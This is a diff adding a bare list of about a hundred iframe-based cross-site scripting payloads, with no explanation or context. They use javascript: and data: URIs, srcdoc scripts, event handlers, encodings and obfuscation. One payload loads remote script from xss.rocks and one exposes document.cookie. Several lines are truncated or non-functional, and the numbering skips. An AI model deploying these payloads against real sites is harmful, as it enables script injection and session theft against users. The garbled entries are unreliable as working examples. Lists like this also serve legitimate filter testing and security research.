@@ -1,0 +1,106 @@
+<iframe src="javascript:alert(1)"></iframe>
+<iframe srcdoc="<script>alert(2)</script>"></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg=="></iframe>
+<iframe onload="alert(4)"></iframe>
+<iframe src="javascript:eval('alert(5)')"></iframe>
+<iframe src="data:text/html,<script>alert(6)</script>"></iframe>
+<iframe srcdoc="&lt;img src=x onerror=alert(7)&gt;"></iframe>
+<iframe src="javascript:window "></iframe>
+<iframe src="vbscript:msgbox(9)"></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxMCk8L3NjcmlwdD4="></iframe>
+<iframe src="javascript:prompt(11)"></iframe>
+<iframe srcdoc="<script>confirm(12)</script>"></iframe>
+<iframe src="data:text/html,<body onload=alert(13)>"></iframe>
+<iframe src="data:text/html;charset=utf-8,<svg onload=alert(14)>"></iframe>
+<iframe srcdoc="<svg onload=alert(15)>"></svg>"></iframe>
+<iframe srcdoc="<iframe src='javascript:alert(16)'></iframe>"></iframe>
+<iframe src="data:text/html,<img src=x onerror=alert(17)>"></iframe>
+<iframe src="javascript:'%3Cscript%3Ealert(18)%3C/script%3E'"></iframe>
+<iframe src="data:text/html,<script src='data:text/javascript,alert(19)'></script>"></iframe>
+<iframe srcdoc="<script>top.alert(20)</script>"></iframe>
+<iframe srcdoc="<input autofocus onfocus=alert(21)>"></iframe>
+<iframe srcdoc="<details ontoggle=alert(22) open>"></iframe>
+<iframe srcdoc="<marquee onstart=alert(23)>"></marquee>"></iframe>
+<iframe src="data:text/html,<video src onerror=alert(24)>"></iframe>
+<iframe srcdoc="<form onsubmit=alert(25)><input type=submit></form>"></iframe>
+<iframe srcdoc="<img src=x onerror=alert(26)>"></iframe>
+<iframe srcdoc="<style>*{background:url('javascript:alert(27)')}</style>"></iframe>
+<iframe src="data:text/html,<meta http-equiv='refresh' content='0;url=javascript:alert(28)'>"></iframe>
+<iframe srcdoc="<script src='//xss.rocks/xss.js'></script>"></iframe>
+<iframe srcdoc="</script><script>alert(30)</script>"></iframe>
+<iframe srcdoc="<body onload='alert(31)'>"></iframe>
+<iframe srcdoc="<script>location='javascript:alert(32)'</script>"></iframe>
+<iframe srcdoc="<object data='javascript:alert(33)'></object>"></iframe>
+<iframe srcdoc="<embed src='javascript:alert(34)'></embed>"></iframe>
+<iframe srcdoc="<script>setTimeout('alert(35)',100)</script>"></iframe>
+<iframe srcdoc="<svg><script>alert(36)</script></svg>"></iframe>
+<iframe src="data:text/html,<script>alert(document.cookie)</script>"></iframe>
+<iframe srcdoc="<script>alert('xss 38')</script>"></iframe>
+<iframe srcdoc="<script>alert(String.fromCharCode(51, 57))</script>"></iframe>
+<iframe src="data:text/html,<iframe src='javascript:alert(40)'></iframe>"></iframe>
+<iframe srcdoc="<script>alert('XSS')</script><iframe>"></iframe>
+<iframe srcdoc="<input onfocus=alert(42) autofocus>"></iframe>
+<iframe srcdoc="<textarea onfocus=alert(43) autofocus></textarea>"></iframe>
+<iframe srcdoc="<math><maction actiontype='tooltip' xlink:href='javascript:alert(44)'><mi>X</mi></maction></math>"></iframe>
+<iframe src="data:text/html,<isindex prompt='XSS' onclick='alert(45)'>"></iframe>
+<iframe srcdoc="<base href='javascript://'><script>alert(46)</script>"></iframe>
+<iframe src="javascript:'<svg/onload=alert(47)>'"></iframe>
+<iframe srcdoc="&#x3C;script&#x3E;alert(48)&#x3C;/script&#x3E;"></iframe>
+<iframe srcdoc="<!--<script>alert(49)</script>-->"></iframe>
+<iframe srcdoc="<!--[if gte IE 4]><script>alert(50)</script><![endif]-->"></iframe>
+<iframe srcdoc="<img src=1 onerror=top.alert(51)>"></iframe>
+<iframe srcdoc="<script>window </script>"></iframe>
+<iframe srcdoc="<script>top </script>"></iframe>
+<iframe srcdoc="<script>this </script>"></iframe>
+<iframe srcdoc="<script>parent </script>"></iframe>
+<iframe srcdoc="<script>window.alert(56)</script>"></iframe>
+<iframe srcdoc="<img src='x' onerror='javascript:alert(57)'>"></iframe>
+<iframe src="data:text/html;charset=utf-7,+ADw-script+AD4-alert(58)+ADw-/script+AD4-"></iframe>
+<iframe srcdoc="<img src=x:alert(59) onerror=eval(src)>"></iframe>
+<iframe srcdoc="<iframe src=javascript:alert(60)></iframe>"></iframe>
+<iframe srcdoc="<script>alert('🧠')</script>"></iframe>
+<iframe srcdoc="<img src=invalid onerror='alert(62)'>"></iframe>
+<iframe srcdoc="<a href='javascript:alert(63)'>click</a>"></iframe>
+<iframe srcdoc="<script>throw 'XSS64'</script>"></iframe>
+<iframe srcdoc="<video onerror='alert(65)'></video>"></iframe>
+<iframe srcdoc="<audio onerror='alert(66)'></audio>"></iframe>
+<iframe srcdoc="<svg><desc><![CDATA[<script>alert(67)</script>]]></desc></svg>"></iframe>
+<iframe srcdoc="<button onclick=alert(68)>click</button>"></iframe>
+<iframe srcdoc="<script>alert(1.69)</script>"></iframe>
+<iframe srcdoc="<div onclick=alert(70)>Click me</div>"></iframe>
+<iframe srcdoc="<script>top['document']['body']['innerHTML']='XSS71'</script>"></iframe>
+<iframe srcdoc="<script>alert('XSS72')</script><!--"></iframe>
+<iframe srcdoc="<script>/*XSS*/alert(73)</script>"></iframe>
+<iframe srcdoc="<script>if(true){alert(74)}</script>"></iframe>
+<iframe srcdoc="<script>while(0){} alert(75)</script>"></iframe>
+<iframe srcdoc="<script>for(i=0;i<1;i++){alert(76)}</script>"></iframe>
+<iframe srcdoc="<script>location.replace('javascript:alert(77)')</script>"></iframe>
+<iframe srcdoc="<script>document.write('<img src=x onerror=alert(78)>')</script>"></iframe>
+<iframe srcdoc="<script>let x=alert;x(79)</script>"></iframe>
+<iframe srcdoc="<script>function x(){alert(80)}x()</script>"></iframe>
+<iframe srcdoc="<script>(()=>alert(81))()</script>"></iframe>
+<iframe srcdoc="<script>new Function('alert(82)')()</script>"></iframe>
+<iframe srcdoc="<script>document.location='javascript:alert(83)'</script>"></iframe>
+<iframe srcdoc="<script>alert(top.name=84)</script>"></iframe>
+<iframe srcdoc="<script>alert(typeof(document))</script>"></iframe>
+<iframe srcdoc="<script>alert(navigator.userAgent)</script>"></iframe>
+<iframe srcdoc="<script>alert(document.URL)</script>"></iframe>
+<iframe srcdoc="<script>alert(parent.frames.length)</script>"></iframe>
+<iframe srcdoc="<script>top.console.log('XSS85')</script>"></iframe>
+<iframe srcdoc="<script>fetch('javascript:alert(86)')</script>"></iframe>
+<iframe srcdoc="<script>alert(innerWidth)</script>"></iframe>
+<iframe srcdoc="<script>alert(opener)</script>"></iframe>
+<iframe srcdoc="<script>alert(window.name)</script>"></iframe>
+<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
+<iframe srcdoc="<script>alert('XSS via iframe 91')</script>"></iframe>
+<iframe srcdoc="<script>with(window){alert(92)}</script>"></iframe>
+<iframe srcdoc="<script>alert(Math.random())</script>"></iframe>
+<iframe srcdoc="<script>window['alert']('93')</script>"></iframe>
+<iframe srcdoc="<script>top['al'+'ert']('94')</script>"></iframe>
+<iframe srcdoc="<script>['alert'][0]('95')</script>"></iframe>
+<iframe srcdoc="<script>alert(`XSS 96`)</script>"></iframe>
+<iframe srcdoc="<script>alert('\x58\x53\x53')</script>"></iframe>
+<iframe srcdoc="<script>alert(1+97)</script>"></iframe>
+<iframe srcdoc="<script>alert(98*1)</script>"></iframe>
+<iframe srcdoc="<script>var x=99;alert(x)</script>"></iframe>
+<iframe srcdoc="<script>try{alert(100)}catch(e){}</script>"></iframe>
